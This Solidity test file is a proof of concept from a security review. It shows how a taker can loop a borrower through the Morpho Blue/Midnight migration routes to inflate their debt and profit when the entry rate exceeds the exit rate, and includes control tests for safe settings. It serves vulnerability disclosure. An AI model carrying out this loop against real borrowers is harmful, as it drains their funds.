// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.13;

import {console2} from "forge-std/console2.sol";
import {MigrationRatifierTestBase} from "../helpers/MigrationRatifierTestBase.sol";
import {IMigrationRatifier} from "../../src/ratifiers/interfaces/IMigrationRatifier.sol";
import {Market} from "@midnight/interfaces/IMidnight.sol";
import {TickLib, MAX_TICK} from "@midnight/libraries/TickLib.sol";
import {WAD, DEFAULT_TICK_SPACING, maxSettlementFee} from "@midnight/libraries/ConstantsLib.sol";
import {TenorMarketIdLib} from "../../src/libraries/TenorMarketIdLib.sol";
import {PriceLib} from "../../src/libraries/PriceLib.sol";
import {IMorpho, Id} from "@morphoBlue/interfaces/IMorpho.sol";
import {MarketParamsLib} from "@morphoBlue/libraries/MarketParamsLib.sol";
import {MorphoBalancesLib} from "@morphoBlue/libraries/periphery/MorphoBalancesLib.sol";

/// @notice Proof of concept (security review, 2026-11-20). Not part of the audited suite.
/// A borrower who has BOTH the Blue->Midnight entry route and the Midnight->Blue exit route live, with
/// "enter rate > exit rate" as recommended by the MigrationRatifier natspec (ROUTE LOOP SAFETY), can be cycled
/// through both routes repeatedly in a single transaction. Each cycle increases the borrower's Morpho Blue debt
/// and pays the difference to the taker.
contract BorrowRouteLoopPoC is MigrationRatifierTestBase {
    using TenorMarketIdLib for Market;
    using MorphoBalancesLib for IMorpho;

    uint256 internal constant YEAR = 365 days;
    uint256 internal constant BLUE_DEBT = 1_000_000e18;
    // Oracle: 1 collateral = 10 loan. 143_000 collateral = 1_430_000 loan value => ~70% LTV (Blue LLTV is 77%).
    uint256 internal constant BLUE_COLLATERAL = 143_000e18;

    address internal attacker;
    bytes32 internal blueId;
    bytes32 internal tenorId;
    Market internal fixedMarket; // 30 days to maturity

    function setUp() public override {
        super.setUp();
        attacker = makeAddr("attacker");
        blueId = Id.unwrap(MarketParamsLib.id(blueMarketParams));
        fixedMarket = sourceMarket; // seeded, maturity = now + 30 days
        tenorId = fixedMarket.toTenorMarketId();

        // No Tenor fee on the entry route (production setting), to isolate the effect.
        defaultRatifier.setFeeConfig(address(borrowBlueToMidnightCallback), bytes32(0), 0, feeRecipient);

        // Blue liquidity, then the borrower's variable-rate position. The base fixture already authorized the
        // two borrow callbacks on Blue and all six callbacks on Midnight for `borrower`.
        loanToken.mint(address(this), 4 * BLUE_DEBT);
        loanToken.approve(address(morphoBlue), 4 * BLUE_DEBT);
        morphoBlue.supply(blueMarketParams, 4 * BLUE_DEBT, 0, address(this), "");
        collateralToken.mint(borrower, BLUE_COLLATERAL);
        vm.startPrank(borrower);
        collateralToken.approve(address(morphoBlue), BLUE_COLLATERAL);
        morphoBlue.supplyCollateral(blueMarketParams, BLUE_COLLATERAL, borrower, "");
        morphoBlue.borrow(blueMarketParams, BLUE_DEBT, 0, borrower, borrower);
        vm.stopPrank();

        // Attacker working capital (a flash loan in practice; it is returned within each cycle).
        loanToken.mint(attacker, 2 * BLUE_DEBT);
        vm.prank(attacker);
        loanToken.approve(address(midnight), type(uint256).max);
    }

    /* ───────────── params ───────────── */

    function _ratePerSecond(uint256 aprWad) internal pure returns (uint40) {
        return uint40(aprWad / YEAR);
    }

    /// @dev Entry: borrower accepts to borrow fixed at up to `aprWad`. Policy is permissive, the limit binds.
    function _entryParams(uint256 aprWad) internal view returns (IMigrationRatifier.UserMigrationParams memory) {
        return IMigrationRatifier.UserMigrationParams({
            interestRatePolicy: address(permissiveRatePolicy), // returns max => min(policy, limit) = limit
            renewalWindow: uint32(7 days),
            minDuration: uint32(7 days),
            maxDuration: uint32(365 days),
            renewalCadence: address(mockCadence),
            limitRatePerSecond: _ratePerSecond(aprWad)
        });
    }

    /// @dev Exit: borrower accepts to go back to variable when the early-repay discount is at least `aprWad`.
    /// Policy returns 0, the limit binds: max(policy, limit) = limit.
    function _exitParams(uint256 aprWad) internal view returns (IMigrationRatifier.UserMigrationParams memory) {
        return IMigrationRatifier.UserMigrationParams({
            interestRatePolicy: address(permissiveLendPolicy),
            renewalWindow: uint32(30 days),
            minDuration: uint32(7 days),
            maxDuration: uint32(365 days),
            renewalCadence: address(0),
            limitRatePerSecond: _ratePerSecond(aprWad)
        });
    }

    function _configure(uint256 entryApr, uint256 exitApr) internal {
        _setParams(borrower, address(borrowBlueToMidnightCallback), blueId, tenorId, _entryParams(entryApr));
        _setParams(borrower, address(borrowMidnightToBlueCallback), tenorId, blueId, _exitParams(exitApr));
    }

    /* ───────────── tick selection (what a taker would compute offchain)
    ───────────── */

    /// @dev Lowest tick the ratifier accepts on the entry route: price >= floor implied by the borrower's ceiling.
    function _entryTick(uint256 entryApr) internal view returns (uint16) {
        uint256 d = fixedMarket.maturity - block.timestamp;
        uint256 floorPrice = PriceLib.computePrice(false, _ratePerSecond(entryApr), d);
        for (uint256 t = 0; t <= MAX_TICK; t += DEFAULT_TICK_SPACING) {
            if (TickLib.tickToPrice(t) >= floorPrice) return uint16(t);
        }
        revert("no entry tick");
    }

    /// @dev Highest tick the ratifier accepts on the exit route: price <= ceiling implied by the borrower's floor.
    function _exitTick(uint256 exitApr) internal view returns (uint16) {
        uint256 d = fixedMarket.maturity - block.timestamp;
        uint256 ceilPrice = PriceLib.computePrice(true, _ratePerSecond(exitApr), d);
        for (uint256 t = MAX_TICK; t > 0; t -= DEFAULT_TICK_SPACING) {
            if (TickLib.tickToPrice(t) <= ceilPrice) return uint16(t);
        }
        revert("no exit tick");
    }

    /* ───────────── one cycle ───────────── */

    function _blueDebt() internal view returns (uint256) {
        return morphoBlue.expectedBorrowAssets(blueMarketParams, borrower);
    }

    function _cycle(uint16 entryTick, uint16 exitTick) internal {
        bytes32 fixedId = sourceMarketId;
        // 1. Entry: attacker lends against the borrower's standing consent. Sized just under the Blue debt.
        uint256 units = (_blueDebt() * 999 / 1000) * WAD / TickLib.tickToPrice(entryTick);
        _takeBorrowBlueToMidnight(borrower, attacker, blueId, units, fixedMarket, entryTick);
        assertEq(midnight.debt(fixedId, borrower), units, "borrower now owes units on Midnight");
        assertEq(midnight.credit(fixedId, attacker), units, "attacker holds the credit");

        // 2. Exit: attacker sells the same credit back to the borrower, who pays by borrowing on Blue.
        _takeBorrowMidnightToBlue(borrower, attacker, blueId, units, fixedMarket, exitTick);
        assertEq(midnight.debt(fixedId, borrower), 0, "borrower back to zero Midnight debt");
        assertEq(midnight.credit(fixedId, attacker), 0, "attacker holds nothing");
    }

    /* ───────────── the attack ───────────── */

    function _runLoop(uint256 entryApr, uint256 exitApr, uint256 cycles)
        internal
        returns (int256 borrowerDebtDelta, int256 attackerDelta)
    {
        _configure(entryApr, exitApr);
        uint16 entryTick = _entryTick(entryApr);
        uint16 exitTick = _exitTick(exitApr);

        uint256 debtBefore = _blueDebt();
        uint256 attackerBefore = loanToken.balanceOf(attacker);
        uint256 borrowerWalletBefore = loanToken.balanceOf(borrower);

        // All cycles happen at one timestamp: this is a single transaction's worth of takes.
        for (uint256 i; i < cycles; ++i) {
            _cycle(entryTick, exitTick);
        }

        assertEq(loanToken.balanceOf(borrower), borrowerWalletBefore, "borrower receives nothing");
        borrowerDebtDelta = int256(_blueDebt()) - int256(debtBefore);
        attackerDelta = int256(loanToken.balanceOf(attacker)) - int256(attackerBefore);

        console2.log("entry tick", entryTick, "exit tick", exitTick);
        console2.log("settlement fee (WAD)", midnight.settlementFee(sourceMarketId, 30 days));
        console2.log("cycles", cycles);
        console2.log("borrower Blue debt delta (1e18)");
        console2.logInt(borrowerDebtDelta);
        console2.log("attacker balance delta (1e18)");
        console2.logInt(attackerDelta);
    }

    /// @notice Natspec-recommended config for a loop ("enter rate > exit rate"): enter at up to 6%, exit at >= 4%.
    function test_poc_borrowLoop_enterAboveExit_drainsBorrower() public {
        (int256 debtDelta, int256 attackerDelta) = _runLoop(0.06e18, 0.04e18, 10);

        assertGt(debtDelta, 0, "borrower's Blue debt grew");
        assertGt(attackerDelta, 0, "attacker profited");
        // Roughly 0.15% of the debt per cycle at 30 days and a 2-point spread.
        assertGt(uint256(debtDelta), 10 * BLUE_DEBT / 1000, "more than 1% of the debt taken in 10 cycles");
    }

    /// @notice Same attack with Midnight's settlement fee at its maximum on every bucket: still profitable.
    function test_poc_borrowLoop_enterAboveExit_profitableAtMaxSettlementFee() public {
        midnight.setFeeSetter(address(this));
        for (uint256 i; i <= 6; ++i) {
            midnight.setMarketSettlementFee(sourceMarketId, i, maxSettlementFee(i));
        }
        (int256 debtDelta, int256 attackerDelta) = _runLoop(0.06e18, 0.04e18, 10);

        assertGt(debtDelta, 0, "borrower's Blue debt grew");
        assertGt(attackerDelta, 0, "attacker profited net of settlement fees");
    }

    /// @notice Control: the opposite ordering (exit rate >= enter rate) costs the taker money on every cycle.
    function test_poc_borrowLoop_exitAboveEnter_isSafe() public {
        (int256 debtDelta, int256 attackerDelta) = _runLoop(0.04e18, 0.06e18, 10);

        assertLe(debtDelta, 0, "borrower's Blue debt did not grow");
        assertLe(attackerDelta, 0, "attacker did not profit");
    }

    /// @notice Control: the same limit on both legs is safe.
    function test_poc_borrowLoop_equalRates_isSafe() public {
        (int256 debtDelta, int256 attackerDelta) = _runLoop(0.05e18, 0.05e18, 10);

        assertLe(debtDelta, 0, "borrower's Blue debt did not grow");
        assertLe(attackerDelta, 0, "attacker did not profit");
    }
}
